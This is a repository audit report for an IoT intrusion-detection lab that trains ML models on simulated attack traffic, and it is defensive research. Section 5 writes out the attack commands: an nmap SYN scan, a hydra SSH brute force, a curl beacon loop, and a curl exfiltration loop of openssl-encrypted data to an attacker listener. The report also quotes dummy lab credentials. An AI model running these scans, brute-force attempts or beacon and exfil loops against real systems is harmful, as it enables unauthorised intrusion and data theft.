# Repository Audit & Technical Evidence Report

**Project:** Detecting Ransomware and Malware Behaviour on IoT Devices Using AI-Based Network Traffic Analysis in a Simulated Environment
**Audit scope:** Chapter 3 (Methodology and Tools) and Chapter 4 (Design and Development) evidence base
**Audit date:** 14 August 2026
**Repository:** `C:\Users\Dravel\Desktop\iot_detection_project` (git branch `main`, latest commit `1f245b5` "update: 8/1/2026")

**How to read this document.** Every claim below is grounded in repository files. File paths are relative to the repository root. Statuses used: **Implemented** (confirmed in code/config/data), **Partially implemented**, **Planned/documented only** (in docs but no implementation), **Not found**. Where a finding affects the accuracy of the report, it is flagged as a **⚠ DISCREPANCY**. Where a number is computed from data files, the derivation is stated.

---

## 1. Repository Structure

```
iot_detection_project/
├── docker-compose.yml                 # 6-container testbed definition
├── README.md                          # Architecture + data flow + fix log
├── .gitignore                         # data/, models/, *.pcap, *.csv, venv/ etc.
├── docker/
│   ├── iot-sensor/                    # Dockerfile + entrypoint.sh (sshd + normal traffic)
│   ├── attacker/                      # Dockerfile + wordlist.txt (Kali, nmap/hydra)
│   ├── capture/                       # Dockerfile + entrypoint.sh (privileged tcpdump)
│   ├── mqtt-broker/                   # mosquitto.conf
│   └── dashboard-api/                 # Dockerfile (FastAPI + Docker CLI)
├── scripts/
│   ├── normal_traffic.py              # benign MQTT/HTTP/ICMP generator
│   ├── listener.py                    # HTTP listener (C2 checkin / exfil upload sink)
│   ├── attack_recon.sh                # nmap SYN scan
│   ├── attack_bruteforce.sh           # hydra SSH brute force
│   ├── attack_beacon.sh               # C2 beacon simulation
│   ├── attack_exfil.sh                # ransomware-style exfil simulation
│   ├── capture_host.sh                # host-side tcpdump on bridge interface
│   ├── capture_rotate.sh              # bridge tcpdump with 30 s rotation
│   └── live_update.sh                 # watch → extract → label → retrain loop
├── ml/
│   ├── extract_features.py            # pcap → flow features (Scapy/pandas)
│   ├── label_flows.py                 # time-overlap ground-truth labelling
│   ├── train_models.py                # RF + LSTM + Autoencoder training
│   ├── evaluate.py                    # F1 / ROC-AUC / FPR + confusion matrices
│   └── requirements.txt               # scapy, pandas, numpy, scikit-learn, tensorflow, keras, matplotlib, seaborn, joblib
├── dashboard/
│   ├── server/main.py                 # FastAPI: data API + capture/pipeline/attack control
│   ├── server/requirements.txt        # fastapi, uvicorn, pandas
│   ├── server/Dockerfile
│   ├── src/                           # TypeScript frontend (api, kpi, chart, table, events, controls, main, types)
│   ├── index.html, build.mjs, package.json, tsconfig.json, pnpm-lock.yaml
│   └── dist/dashboard.js              # built bundle (present)
├── models/                            # trained artefacts + results (gitignored)
│   ├── random_forest.joblib           # RF model
│   ├── lstm_model.keras               # LSTM model
│   ├── autoencoder_model.keras        # AE model
│   ├── scaler.joblib                  # StandardScaler (fit on train only)
│   ├── autoencoder_threshold.json     # {"threshold": 0.22908447339926985}
│   ├── holdout_test_set.csv           # 30,638-row 20% holdout
│   ├── evaluation_results.csv         # stored metrics (see §15)
│   └── *_confusion_matrix.png         # 3 PNG confusion-matrix plots
├── data/                              # generated data (gitignored)
│   ├── flows.csv                      # 162,174 rows of extracted flows
│   ├── labeled_flows.csv              # 153,188 labelled flows (model input)
│   ├── attack_log.csv                 # ground-truth START/END log
│   ├── nmap_scan.txt, hydra_result.txt# attack tool outputs
│   ├── .live_state                    # pipeline processed-segment tracker
│   └── segments/capture.pcap0..265    # 266 captured 30 s segments (see §6)
├── docs/
│   ├── RUNBOOK.md                     # full lab setup/usage guide
│   ├── RUNBOOK-WIN.md                 # Windows/PowerShell variant
│   ├── report_notes.md                # short design notes
│   └── Methodology-Chapter-3.docx     # draft Chapter 3 text (44 KB)
└── venv/                              # local Python 3.12.10 environment
```

| Component | Path | Purpose | Status |
|---|---|---|---|
| Compose definition | `docker-compose.yml` | 6 containers, bridge network 192.168.50.0/24 | Implemented |
| Benign traffic generator | `scripts/normal_traffic.py` | MQTT + HTTP + ICMP from iot-sensor | Implemented |
| Attack scripts | `scripts/attack_recon.sh`, `attack_bruteforce.sh`, `attack_beacon.sh`, `attack_exfil.sh` | 4 simulated attacks | Implemented |
| C2/exfil sink | `scripts/listener.py` | HTTP listener in attacker container | Implemented |
| Capture | `scripts/capture_host.sh`, `capture_rotate.sh`, `docker/capture/` | tcpdump, 30 s rotation | Implemented |
| Live pipeline | `scripts/live_update.sh` | watch segments → extract → label → retrain | Implemented |
| Feature extraction | `ml/extract_features.py` | pcap → 15 flow features | Implemented |
| Labelling | `ml/label_flows.py` | time-overlap labels from attack log | Implemented |
| Model training | `ml/train_models.py` | RF, LSTM, Autoencoder | Implemented |
| Evaluation | `ml/evaluate.py` | F1, ROC-AUC, FPR, confusion matrices | Implemented |
| Dashboard backend | `dashboard/server/main.py` | FastAPI API + control endpoints | Implemented |
| Dashboard frontend | `dashboard/src/*`, `index.html` | KPI/table/chart/events UI | Implemented |
| Trained models | `models/*.joblib`, `models/*.keras` | persisted models | Implemented |
| Results | `models/evaluation_results.csv`, `*_confusion_matrix.png`, `autoencoder_threshold.json` | stored evaluation output | Implemented |
| Dataset | `data/flows.csv`, `data/labeled_flows.csv` | flow dataset | Implemented |
| Ground truth | `data/attack_log.csv` | attack intervals | Implemented |
| PCAP segments | `data/segments/capture.pcap0..265` | captured traffic | Implemented |
| Runbooks | `docs/RUNBOOK.md`, `docs/RUNBOOK-WIN.md` | reproducible procedure | Implemented |
| Chapter 3 draft | `docs/Methodology-Chapter-3.docx` | report draft | Documented (draft) |
| Tests | — | no test files anywhere in the repo | Not found |
| Notebooks | — | no Jupyter notebooks | Not found |
| Dataset builder | `build_dataset.py`, `quick_start.sh`, root-level `train_models.py` | existed in commit `cbe7dd2`, **deleted** in `f1303a7` | Removed (historical) |

**Notable**: `data/` and `models/` are gitignored; the datasets, trained models and results exist only on this machine (not in version control). No unit/integration test files exist.

---

## 2. Technology Stack

Confirmed from files and from the local `venv` (`venv/pyvenv.cfg` and `venv/Scripts/python.exe -m pip list`).

| Technology | Version | Evidence/File | Actual Use |
|---|---|---|---|
| Python (host/venv) | 3.12.10 | `venv/pyvenv.cfg` | Runs ML pipeline, feature extraction, evaluation |
| Python (containers) | 3.11-slim | `docker/iot-sensor/Dockerfile`, `docker/dashboard-api/Dockerfile` | Runs normal traffic generator, dashboard |
| Docker / Compose | Compose V2 (not versioned) | `docs/RUNBOOK.md` §Prerequisites | Testbed orchestration |
| Docker Desktop | not specified (WSL2 backend stated in docs) | `docs/RUNBOOK-WIN.md`, `docs/Methodology-Chapter-3.docx` §3.1.1 | Host runtime |
| Bash | n/a | `scripts/*.sh` | Capture loop, pipeline loop, attack launchers |
| Scapy | 2.7.0 | venv; `ml/extract_features.py:12` | `rdpcap()` only — pcap reading |
| pandas | 3.0.5 | venv | Flow CSV processing, labelling |
| NumPy | 2.5.1 | venv | Array/feature math |
| scikit-learn | 1.9.0 | venv | RandomForestClassifier, StandardScaler, train_test_split, metrics |
| TensorFlow | 2.21.0 | venv | LSTM + Autoencoder |
| Keras | 3.15.1 | venv | Model API |
| matplotlib | 3.11.1 | venv | Confusion matrix PNGs |
| seaborn | 0.13.2 | venv | Confusion matrix heatmaps |
| joblib | 1.5.3 | venv | Model/scaler persistence |
| fastapi | 0.141.1 | venv + `dashboard/server/requirements.txt` | Dashboard API |
| uvicorn | 0.52.0 | venv | ASGI server (port 8000) |
| paho-mqtt | not pinned | `docker/iot-sensor/Dockerfile:11` | MQTT publishing (container only, not in host venv) |
| Eclipse Mosquitto | image `eclipse-mosquitto:2` | `docker-compose.yml:3` | MQTT broker |
| Nginx | image `nginx:alpine` | `docker-compose.yml:13` | Fake web service |
| tcpdump | not pinned (Ubuntu latest image) | `docker/capture/Dockerfile:3`, `scripts/capture_rotate.sh:13` | Packet capture |
| Nmap | 7.99 (from run output) | `data/nmap_scan.txt` | Recon simulation |
| Hydra | 9.7 (from run output) | `data/hydra_result.txt` | Brute-force simulation |
| openssl | container Debian | `docker/iot-sensor/Dockerfile:8`, `scripts/attack_exfil.sh:10` | AES-256-CBC encryption in exfil sim |
| curl | container | `scripts/attack_beacon.sh:11`, `attack_exfil.sh:14` | C2 checkins, exfil uploads |
| netcat-openbsd | installed, **unused** | `docker/attacker/Dockerfile:7` | Installed but no script calls it |
| TypeScript / esbuild / Chart.js | TS 5.9.3, esbuild 0.24.2 | `dashboard/package.json`, `package-lock.json` | Frontend build |
| Databases | none | — | No DB; CSV files are the store |

**Python version**: The Chapter 3 draft states "Python 3.12" — consistent with the host venv (`venv/pyvenv.cfg`, Python 3.12.10). Container images use Python 3.11.

---

## 3. Docker / Testbed Architecture

### 3.1 Containers

| Service | Base image | Purpose | Installed tools | Ports | Networks/IP | Dependencies |
|---|---|---|---|---|---|---|
| `mqtt-broker` | `eclipse-mosquitto:2` | MQTT broker | — | 1883 (in-container, not published) | `iot_sim_net` 192.168.50.10 | none |
| `iot-web` | `nginx:alpine` | Fake web service | nginx | 80 (in-container) | `iot_sim_net` 192.168.50.11 | none |
| `iot-sensor` | `python:3.11-slim` | Simulated IoT device | sshd, mosquitto-clients, curl, cron, openssl, paho-mqtt | 22 (in-container) | `iot_sim_net` 192.168.50.20 | mqtt-broker, iot-web (`depends_on`) |
| `attacker` | `kalilinux/kali-rolling` | Attack origin | nmap, hydra, curl, netcat, python3 | none | `iot_sim_net` 192.168.50.99; `cap_add: NET_ADMIN, NET_RAW` | none |
| `dashboard-api` | `python:3.11-slim` | Dashboard backend + control | fastapi/uvicorn, ML deps, **docker CLI** | host `8000:8000` | `iot_sim_net` (auto-assigned) | none |
| `capture` (`iot-capture`) | `ubuntu:latest` | Packet capture | tcpdump | none | **host network**, privileged | none |

Source: `docker-compose.yml` (lines 1–81).

- Environment variables: **none are set** in `docker-compose.yml` (no secrets/credentials are configured via environment anywhere).
- Volume mounts: `./scripts` (ro) and `./data` into `iot-sensor` and `attacker`; `./data/segments` into `capture`; `./dashboard`, `./models`, `./data`, `./scripts` (ro), `./ml` (ro) and `/var/run/docker.sock` into `dashboard-api`. The dashboard container mounts the Docker socket so it can `docker exec` into `iot-capture`/`attacker` — a notable security-relevant design (control-plane access).
- **Credentials found in repo** (do not print/quote in report): the simulated device login `iotuser`/`iotpass123` is hard-coded in `docker/iot-sensor/Dockerfile:13` and is the last entry of the brute-force wordlist (`docker/attacker/wordlist.txt`, 109 lines) — these are lab dummy credentials, not real secrets. The exfil script uses a hard-coded dummy passphrase `labkey` (`scripts/attack_exfil.sh:13`).

### 3.2 Network architecture

- One user-defined bridge network `iot_sim_net`, subnet **192.168.50.0/24** (`docker-compose.yml:76-81`).
- Static IPs: broker 192.168.50.10, web 192.168.50.11, sensor 192.168.50.20, attacker 192.168.50.99; `dashboard-api` and capture on host net auto-assigned.
- Direction of communication:
  - sensor → broker: MQTT TCP 1883 (`scripts/normal_traffic.py:9,23-24`), topic `sensors/temperature` (payload `{"temp": N}`, N ∈ 20–30, QoS 0).
  - sensor → web: HTTP GET TCP 80 (`normal_traffic.py:29-33`), ICMP echo (attempted, see §4).
  - attacker → sensor: nmap TCP SYN to ports 1–1000 (`attack_recon.sh:7`); hydra SSH TCP 22 (`attack_bruteforce.sh:7-8`).
  - attacker → itself (192.168.50.99): C2 checkins `GET /checkin` TCP 8080 and exfil `POST /upload` TCP 8080 to the listener running **in the attacker container** (`attack_beacon.sh:3`, `attack_exfil.sh:14`, `listener.py:36`).
- MQTT broker config: `listener 1883`, `protocol mqtt`, `allow_anonymous true` (`docker/mqtt-broker/mosquitto.conf`).
- The capture container runs with `network_mode: host` + `privileged: true` so tcpdump can see the bridge (`docker-compose.yml:67-74`).

### 3.3 Architecture flow (as implemented)

```
iot-sensor (normal_traffic.py: MQTT/HTTP/ICMP) ─┐
attacker (nmap/hydra/beacon/exfil scripts) ─────┼─► iot_sim_net bridge 192.168.50.0/24
                                                │
                    tcpdump (host/privileged, -i any, 30 s segments)
                                    │  data/segments/capture.pcapN
                                    ▼
               live_update.sh ──► extract_features.py (pcap → flows.csv)
                                    │
                                    ▼
                    label_flows.py (flows.csv + attack_log.csv → labeled_flows.csv)
                                    │
                                    ▼
                  train_models.py (RF, LSTM, AE → models/*.joblib|.keras)
                                    │
                                    ▼
                   evaluate.py (F1, ROC-AUC, FPR, confusion matrices → models/)
                                    │
                                    ▼
        dashboard (FastAPI reads CSVs; Docker-socket control of capture/attacks)
```

All steps exist. Note the flow is **batch/retrained in a loop**, not a real-time inference path: `live_update.sh` (lines 46–112) re-runs extraction, labelling, training and evaluation whenever new segments or a modified attack log are detected (retrain every 5 segments by default, `--train-every N`).

---

## 4. Benign Traffic Generation

| Item | Finding |
|---|---|
| Script | `scripts/normal_traffic.py` (55 lines) |
| Executed in | `iot-sensor` container — started by `docker/iot-sensor/entrypoint.sh:4` (`python3 /scripts/normal_traffic.py &`), or manually via `docker exec -d iot-sensor python3 /scripts/normal_traffic.py` (RUNBOOK §8) |
| Protocols | MQTT publish TCP 1883 (always), HTTP GET TCP 80 (30% probability per cycle), ICMP ping (10% probability per cycle) |
| Timing | infinite loop, sleep 3–8 s random per cycle (`normal_traffic.py:55`) |
| MQTT | topic `sensors/temperature`, JSON payload `{"temp": 20–30}`, paho-mqtt client, anonymous broker, QoS 0 |
| Simulated devices | **One** — the iot-sensor container (IP 192.168.50.20) |
| Duration | continuous; ran during capture (RUNBOOK §8: "keep running during attacks") |
| Labelling | flows with start/end outside all attack intervals are labelled `NORMAL` (`label_flows.py:46-57`) |
| SSH sessions | ⚠ **DISCREPANCY**: the Chapter 3 draft states normal traffic includes "SSH control sessions". `normal_traffic.py` contains no SSH code — sshd runs in the sensor container (`entrypoint.sh:3`) but no script opens SSH sessions. |

**Data check**: no ICMP flows (proto 1) exist in `flows.csv`/`labeled_flows.csv` (161,982 TCP + 192 UDP + 0 ICMP of 162,174 rows). The sensor container has no `NET_RAW` capability (`docker-compose.yml` grants `cap_add` only to `attacker`), so its `ping` calls most likely fail — the ICMP pings are effectively **not present in the captured data**.

---

## 5. Malicious / Attack Traffic Generation

All four attacks are **synthetic simulations** executed from the attacker container with real tools (nmap, hydra, curl) against sandbox targets inside the isolated lab network. Every script writes `TIMESTAMP,<ATTACK>_START,src,dst` / `..._END,...` lines to `data/attack_log.csv` (appended by the dashboard control endpoint, `dashboard/server/main.py:372-397`, or manually per RUNBOOK §11a).

### 5.1 Reconnaissance — `scripts/attack_recon.sh`
- `nmap -sS -p 1-1000 192.168.50.20` (SYN scan; falls back to `-sT` connect scan), output to `/data/nmap_scan.txt`.
- Duration in practice: ~0.4–0.6 s (from attack log: RECON_START→END at 12:45:57→12:45:58Z and 13:31:25→13:31:25Z).
- Real tool, synthetic scenario; scan result: port 22 open (`data/nmap_scan.txt`).
- Labelled `RECON` by time overlap; **no RECON flows exist in the dataset** (see §9).

### 5.2 Credential brute forcing — `scripts/attack_bruteforce.sh`
- `hydra -l iotuser -P /usr/share/wordlists/lab_passwords.txt ssh://192.168.50.20` (11-line script).
- Wordlist: `docker/attacker/wordlist.txt` — **109 passwords** (dummy lab list; contains the sensor's actual password as the final entry).
- Attempts: Hydra output records "109 login tries (l:1/p:109), ~7 tries per task"; runs took ~34–39 s (12:46:00→12:46:36Z; 13:33:04→13:33:43Z). First run found the valid password; second run reported 0 valid (incomplete run with restore file).
- Real brute-force tool against the sandboxed SSH service; labelled `BRUTEFORCE`; **no BRUTEFORCE flows exist in the dataset** (see §9).

### 5.3 C2 beaconing — `scripts/attack_beacon.sh`
- `curl -s "http://192.168.50.99:8080/checkin?id=$(hostname)"` repeated in a loop.
- Destination: the listener running inside the **attacker container itself** (192.168.50.99:8080, `scripts/listener.py` — `GET /checkin` logs the checkin and replies `OK`).
- **Jitter: `SLEEP_SEC=$((40 + RANDOM % 20))` → 40–59 s between checkins** (`attack_beacon.sh:12-13`). ⚠ **DISCREPANCY**: the intended range is described as "40–60 s"; the actual maximum is 59 s (RANDOM % 20 ∈ 0–19). The 40–60 s claim does exist in the code in substance, but not the exact 60 s bound.
- Default duration `DURATION=180` s (parameter `$1`; dashboard passes `duration`, default 180, `dashboard/server/main.py:373,379-380`). Actual runs: 12:48:10→12:51:35Z (205 s) and 13:34:02→13:37:10Z (188 s), 13:37:23→13:40:43Z (200 s).
- Labelled `C2_BEACON`. ⚠ **DISCREPANCY**: zero dataset flows involve 192.168.50.99 (see §9) — the beacon's own traffic was never captured.

### 5.4 Ransomware-style network behaviour — `scripts/attack_exfil.sh`
- **It is a network-behaviour simulation, not actual ransomware**: no victim file system is touched and nothing is encrypted on a victim.
- Behaviour per iteration (×20): `dd` 2 MB of `/dev/urandom` to a scratch file → `openssl enc -aes-256-cbc -salt` with hard-coded dummy passphrase → `curl -X POST --data-binary` upload to `http://192.168.50.99:8080/upload` (listener logs byte count) → scratch dir deleted.
- Timing: runs in ~1–2 s in practice (12:53:30→12:53:31Z; 13:41:30→13:41:31Z).
- So: encrypted data is **synthesised, then "exfiltrated" to a sink listener inside the attacker container**; the traffic pattern (bulk POSTs) models ransomware-style exfiltration. Actual exfil volumes: total ~5.86 MB in labeled flows' bytes (see §9) — of which virtually all is background traffic (see §9 caveat).
- Labelled `EXFIL_RANSOMWARE`. ⚠ The Chapter 3 draft describes the tool as "netcat"; the implementation uses `curl`.

| Attack Class | Implemented? | Script/File | Main Function/Command | Behaviour | Protocol | Timing | Label |
|---|---|---|---|---|---|---|---|
| Reconnaissance | Implemented (synthetic scan) | `scripts/attack_recon.sh` | `nmap -sS -p 1-1000` | SYN/connect scan of 192.168.50.20 | TCP | ~0.5 s per run | `RECON` (none in dataset) |
| Credential brute force | Implemented (synthetic) | `scripts/attack_bruteforce.sh` | `hydra -l iotuser -P lab_passwords.txt ssh://` | 109 password attempts vs SSH 22 | TCP | ~35–39 s per run | `BRUTEFORCE` (none in dataset) |
| C2 beaconing | Implemented (synthetic) | `scripts/attack_beacon.sh` | `curl GET :8080/checkin` loop | periodic checkins, jitter 40–59 s | HTTP TCP | 180 s default (runs 188–205 s) | `C2_BEACON` |
| Ransomware-style exfil | Implemented (simulation only) | `scripts/attack_exfil.sh` | dd + `openssl aes-256-cbc` + `curl POST :8080/upload` | 20× 2 MB encrypted uploads | HTTP TCP | ~1–2 s per run | `EXFIL_RANSOMWARE` |

**No real malware was used.** All attack behaviour is scripted tool use inside the isolated lab; the "ransomware" is purely a network-pattern simulation.

---

## 6. Packet Capture

| Item | Finding |
|---|---|
| Tool | tcpdump, inside the privileged host-network `iot-capture` container (`docker/capture/Dockerfile:3`); the container itself only runs `sleep infinity` — tcpdump is launched by `docker exec` (`docker/capture/entrypoint.sh:2-3` comment) |
| Launch mechanisms | (a) Dashboard endpoint `POST /api/control/capture/start` → `docker exec iot-capture sh -c "nohup tcpdump -i any -n net 192.168.50.0/24 -G 30 -W 500 -w /data/segments/capture.pcap …"` (`dashboard/server/main.py:292-314`); (b) host scripts `capture_host.sh` (single file, bridge interface `br-<netid>`) and `capture_rotate.sh` (`-G 30 -W 500`); (c) RUNBOOK §7 manual loop `timeout 30 tcpdump -i any -n -w capture.pcap$COUNTER` (no subnet filter) |
| Interface | `-i any` (dashboard + RUNBOOK) or `br-<network-id>` (host scripts) |
| Capture filters | Dashboard: BPF `net 192.168.50.0/24`; RUNBOOK manual loop and `capture_rotate.sh`: none |
| Duration / rotation | 30-second segments (`-G 30`), up to 500 files (`-W 500`); actual corpus: 266 segments (`data/segments/capture.pcap0..265`) covering **2026-08-01 12:41:14Z → 14:59:18Z** (verified by reading packet timestamps with Scapy) |
| File format | pcap; naming `capture.pcapN` (rotation suffix); stored in `data/segments/` |
| Live vs offline | **Live capture** of the running testbed, then read offline by `extract_features.py` via Scapy `rdpcap()` (`ml/extract_features.py:12,33`) |
| Stop | `POST /api/control/capture/stop` → `docker exec iot-capture pkill tcpdump` (`main.py:326-338`) |

**Critical capture findings (evidence-backed):**
1. The dashboard's `net 192.168.50.0/24` filter is only applied to its own capture; RUNBOOK §7's capture (no filter) recorded Docker Desktop host/NAT traffic (`192.168.65.x`, `172.17.x`, `172.20.x`, even public internet IPs) into the dataset. `labeled_flows.csv` contains **133,132 of 145,020 NORMAL flows (91.8%) from outside the 192.168.50.0/24 subnet**.
2. **No flow in the whole dataset involves the attacker IP 192.168.50.99** (verified programmatically). The C2/exfil traffic targets 192.168.50.99:8080 — self-to-self traffic inside the attacker container that is invisible to host-side `-i any` capture. Port-8080 flows: **0** in `labeled_flows.csv`.
3. Recon/bruteforce packets WERE captured in segments (e.g., `capture.pcap10`, `capture.pcap100` contain hundreds of TCP port-22 packets, verified by reading them), but the corresponding segments were skipped by `live_update.sh` and never entered `flows.csv` (see §16/§20). Root cause: tcpdump restarts reuse segment names `capture.pcap0..N`; `live_update.sh` permanently skips names already recorded in `data/.live_state`, silently discarding re-captured segments.

---

## 7. Flow Extraction

**File:** `ml/extract_features.py` — `extract_flows()` (lines 37–62) and `compute_features()` (lines 65–132).

Algorithm in plain language:

1. Read the whole pcap with Scapy `rdpcap()`.
2. For each packet containing an IP layer, derive a flow key `(src_ip, src_port, dst_ip, dst_port, proto)` from the packet's **own** header fields (`IP.src`, `IP.dst`, `IP.proto`, TCP/UDP ports; ports 0 for non-TCP/UDP) and append the packet to a dictionary bucket (`extract_flows`, lines 43–57).
3. For each bucket, compute features over the bucket's packets: timestamps via `float(p.time)` (the documented numpy/Scapy `EDecimal` fix), sizes via `len(p)` (captured frame length, includes link-layer header).
4. Emit one CSV row per bucket.

Important algorithmic properties (verified against code):

| Property | Actual implementation |
|---|---|
| Five-tuple | `(src_ip, src_port, dst_ip, dst_port, proto)` — as it appears in each packet |
| Bidirectional flows | **No.** The flow is **unidirectional**: packets from A→B and B→A form two separate flows. No pairing/folding of the two directions is performed. The `fwd_*`/`bwd_*` columns are **placeholders**: `fwd_packets = total_packets`, `bwd_packets = 0`, `fwd_bytes = total_bytes`, `bwd_bytes = 0` (`compute_features` lines 79–82). ⚠ Any report text implying genuine forward/reverse statistics would be inaccurate. |
| Flow timeout | **None.** A flow is defined solely by bucket membership within one pcap file; a long-lived connection spanning segments is split across files, and no idle timeout or max-life cap exists. |
| Flow start/end | `start_time = first packet time`, `end_time = last packet time`; `duration = end - start` (0.0 if a single packet) |
| Packet/byte counts | `total_packets = len(bucket)`, `total_bytes = Σ len(packet)` |
| Inter-arrival times | `np.diff(timestamps)`; mean/std (0.0 if ≤1 packet) |
| TCP/UDP handling | Only port extraction; no flags, no retransmission/state logic, no protocol-specific handling |
| Cross-flow feature | `dst_ip_entropy`: Shannon entropy (base 2) of the set of destination IPs contacted by the **same src_ip within the preceding 10 s** (`flow_start - 10.0`), over flows in the same pcap only (`compute_features` lines 100–104; `shannon_entropy` lines 18–29) |
| Port heuristic | `uncommon_port = 1` if `dst_port ∉ {80, 443, 22, 1883, 8080, 53}` |
| Label noise in entropy | The dst-history includes flows regardless of direction, so reverse-direction flows of the same pair double-count |

Derived pseudocode (faithful to the code):

```
for each pcap segment:
    packets ← rdpcap(segment)
    flows ← {}
    for pkt in packets with IP:
        key ← (pkt.IP.src, pkt.tcp/udp.sport|0, pkt.IP.dst, pkt.tcp/udp.dport|0, pkt.IP.proto)
        flows[key] ← flows[key] ∪ {pkt}
    rows ← []
    dst_history ← {}
    for (key, pkts) in flows:
        ts ← [float(p.time) for p in pkts]; sizes ← [len(p) for p in pkts]
        duration ← last(ts) − first(ts)                    # 0 if 1 packet
        iats ← diff(ts);  mean_iat/std_iat ← stats(iats)   # 0 if ≤1 packet
        dst_history[src_ip] += (first(ts), dst_ip)
        entropy ← shannon(dst IPs in last 10 s from same src_ip)
        rows ← row(src, dst, ports, proto, start/end, duration,
                   total_packets, total_bytes, fwd=total, bwd=0, mean/std pkt len,
                   mean/std iat, pkts_per_sec, bytes_per_sec,
                   uncommon_port, dst_ip_entropy)
    write rows to CSV (one file per invocation)
```

---

## 8. Exact 15 Features

The report's "15 flow-based features" **matches the implementation exactly**: `ml/train_models.py:161-166` selects these 15 columns (plus `src_ip`/`start_time`/`label` for LSTM sequence building).

| # | Feature Name | Definition/Calculation (from `ml/extract_features.py`) | Data Type | Direction | Source Code |
|---|---|---|---|---|---|
| 1 | `duration` | `timestamps[-1] − timestamps[0]` (0.0 if <2 packets) | float (s) | both (single direction only) | `extract_features.py:75` |
| 2 | `total_packets` | `len(pkts)` | int | both | `:76` |
| 3 | `total_bytes` | `Σ len(pkt)` (frame bytes incl. headers) | int | both | `:77` |
| 4 | `fwd_packets` | `= total_packets` (placeholder, no direction split) | int | nominal "fwd" | `:79` |
| 5 | `bwd_packets` | `= 0` (placeholder) | int | nominal "bwd" | `:80` |
| 6 | `fwd_bytes` | `= total_bytes` (placeholder) | int | nominal "fwd" | `:81` |
| 7 | `bwd_bytes` | `= 0` (placeholder) | int | nominal "bwd" | `:82` |
| 8 | `mean_pkt_len` | `mean(sizes)` (0.0 if empty) | float (bytes) | both | `:84` |
| 9 | `std_pkt_len` | `std(sizes)` (0.0 if ≤1 packet) | float | both | `:85` |
| 10 | `mean_iat` | `mean(np.diff(timestamps))` (0.0 if ≤1 packet) | float (s) | both | `:87-93` |
| 11 | `std_iat` | `std(np.diff(timestamps))` (0.0 if ≤1 packet) | float | both | `:87-93` |
| 12 | `pkts_per_sec` | `total_packets / duration` (0.0 if duration=0) | float (1/s) | both | `:95` |
| 13 | `bytes_per_sec` | `total_bytes / duration` (0.0 if duration=0) | float (B/s) | both | `:96` |
| 14 | `uncommon_port` | `1` if `dst_port ∉ {80,443,22,1883,8080,53}` else `0` | int (binary) | dst direction | `:98` |
| 15 | `dst_ip_entropy` | Shannon entropy (base 2) of dst IPs contacted by the same src_ip in the last 10 s, within the same pcap | float (bits) | src-side, cross-flow | `:100-104` |

Category summary: statistical = 8, 9, 10, 11, 15; count-based = 2–7; rate/duration = 1, 12, 13; heuristic binary = 14; temporal = 10, 11 (+ `start_time`, `end_time` metadata columns); directional = 4–7 **but not truly directional in the data** (see §7). Metadata columns additionally present in CSVs: `src_ip, src_port, dst_ip, dst_port, proto, start_time, end_time, label`.

⚠ For the report: the features exist as claimed (15), but the forward/reverse features are nominal placeholders and `dst_ip_entropy` is computed over a per-pcap, per-source window rather than a true destination-IP set per flow.

---

## 9. Dataset

Computed by loading `data/labeled_flows.csv` (the exact file `train_models.py` consumes).

| Property | Value |
|---|---|
| Files | `data/flows.csv` (unlabelled, 162,174 rows), `data/labeled_flows.csv` (labelled, **153,188 rows**), `models/holdout_test_set.csv` (30,638 rows) |
| Format | CSV; 22 columns in flows.csv, 23 with `label` |
| Feature columns | the 15 features of §8 + identifiers/timestamps |
| Time range | 2026-07-31T14:58:59Z → 2026-08-01T14:54:56Z, with a **large data gap**: no flows at all between 2026-07-31 ~18:00Z and 2026-08-01 13:34Z (58,814 flows from the Jul-31 session; 94,374 flows from the Aug-1 13:34–14:55 session) |
| Labels present | `NORMAL`, `C2_BEACON`, `EXFIL_RANSOMWARE` only |
| Missing labels | `RECON` and `BRUTEFORCE`: attacks executed (attack log, nmap/hydra outputs) but **0 flows** overlap their intervals — the recon/bruteforce segments were skipped by the pipeline (see §6/§20) |
| Class imbalance | extreme: NORMAL 94.67% |
| Duplicates | **no deduplication**: 66,187 fully duplicated rows and 94,386 duplicate flow keys (overlapping 30 s segments append the same flows repeatedly) |
| Data integrity | `dst_ip_entropy` is computed per segment, so identical flows across segments have different entropy values (i.e., duplicates are not even identical); no de-duplication step exists in any script |

**Class distribution (exact, computed):**

| Class | Number of Samples | Percentage |
|---|---|---|
| NORMAL | 145,020 | 94.67% |
| C2_BEACON | 8,068 | 5.27% |
| EXFIL_RANSOMWARE | 100 | 0.07% |
| RECON | 0 | 0% |
| BRUTEFORCE | 0 | 0% |
| **Total** | **153,188** | 100% |

Holdout split (computed from `models/holdout_test_set.csv`): NORMAL 29,004; C2_BEACON 1,614; EXFIL_RANSOMWARE 20 (total 30,638 ≈ 20%).

**⚠ Major data-quality findings (computed facts):**
- **Attacker traffic is entirely absent**: 0 flows in the entire dataset involve 192.168.50.99; 0 flows use port 8080. The 8,068 "C2_BEACON" and 100 "EXFIL_RANSOMWARE" flows are almost entirely **unrelated background traffic** (Docker Desktop internal NAT `192.168.65.1↔192.168.65.7` port 2376: 7,084 of 8,068 C2 flows; MQTT 1883: 256; HTTP 80: 160; dashboard port 8000: 166; various ephemeral pairs) that merely overlapped the attack time windows.
- NORMAL is polluted with Docker Desktop host traffic: 133,132/145,020 (91.8%) outside the lab subnet, including public internet IPs (Fastly `151.101.x`, AWS CloudFront `3.164.x`, etc.) and Docker NAT (`192.168.65.x` accounts for ~269k of ~306k src+dst entries).
- **Implication**: the models were trained on background-vs-background distinctions, not on actual attack-vs-benign traffic — this is consistent with the stored evaluation results (§15) and must be addressed in Chapters 3/4 (or the experiment must be re-run with corrected capture/labelling).

Split parameters: `train_test_split(..., test_size=0.2, random_state=42, stratify=y)` — `ml/train_models.py:178-180` (RF and scaler; used to save `holdout_test_set.csv`). Stratified only for RF; the LSTM sequence split (`train_models.py:215-217`) is **not stratified**; the Autoencoder uses no split (see §13). Seed 42 is used consistently.

---

## 10. Data Preprocessing

Only the following exist — all inside `ml/train_models.py` (no separate preprocessing module):

| Step | Implemented? | File/Function | Details |
|---|---|---|---|
| Missing-value handling | Partially | `train_models.py:207` | `dropna(subset=features)` only for LSTM data; no imputation; no missing values present in current data (computed: 0 nulls) |
| Duplicate removal | **Not implemented** | — | none anywhere |
| Outlier handling | Not implemented | — | none |
| Label encoding | Partially | `train_models.py:202-203` (`pd.factorize` for LSTM), `evaluate.py:63-64`/`131-133` (LabelEncoder per model) | string labels kept for RF; factorized for LSTM; binarized NORMAL-vs-other for AE |
| One-hot encoding | Not implemented | — | none |
| Normalization | Not implemented | — | none |
